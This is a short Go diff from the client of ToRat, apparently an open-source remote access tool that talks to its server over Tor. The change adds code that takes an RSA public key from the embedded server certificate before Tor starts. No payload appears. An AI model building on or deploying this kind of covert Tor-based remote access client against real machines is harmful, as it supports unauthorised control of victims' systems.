@@ -1,6 +1,7 @@
 package client
 
 import (
+	"crypto/rsa"
 	"crypto/tls"
 	"crypto/x509"
 	"log"
@@ -8,6 +9,7 @@ import (
 	"time"
 
 	"github.com/cretz/bine/tor"
+	"github.com/lu4p/ToRat_client/crypto"
 )
 
 const (
@@ -22,6 +24,8 @@ const (
 const serverCert = `-----BEGIN CERTIFICATE-----
 ____ CERTIFICATE GOES HERE | DONT INDENT ____
 -----END CERTIFICATE-----`
+
+var ServerPubKey *rsa.PublicKey
 
 type connection struct {
 	Conn    net.Conn
@@ -45,8 +49,14 @@ func connect(dialer *tor.Dialer) (net.Conn, error) {
 	return tlsconn, nil
 }
 
+// NetClient start tor and invoke connect
 func NetClient() {
 	log.Println("NetClient")
+	var err error
+	ServerPubKey, err = crypto.CertToPubKey(serverCert)
+	if err != nil {
+		log.Fatalln("[!] Could not extract RsaKey from cert")
+	}
 	conf := tor.StartConf{ExePath: TorExe, ControlPort: 9051, DataDir: TorData, NoAutoSocksPort: true}
 	t, err := tor.Start(nil, &conf)
 	if err != nil {
